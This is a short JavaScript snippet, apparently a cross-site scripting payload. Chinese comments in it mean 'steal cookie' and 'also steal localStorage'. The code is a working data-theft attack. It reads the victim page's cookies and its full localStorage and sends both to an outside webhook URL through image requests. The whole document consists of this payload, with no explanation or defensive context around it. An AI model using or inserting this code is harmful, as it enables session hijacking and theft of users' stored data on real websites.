(function() {
    const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
    
    // 偷 cookie
    new Image().src = WEBHOOK + '/?c=' + encodeURIComponent(document.cookie);
    
    // 也偷 localStorage
    new Image().src = WEBHOOK + '/?l=' + encodeURIComponent(JSON.stringify(localStorage));
})();
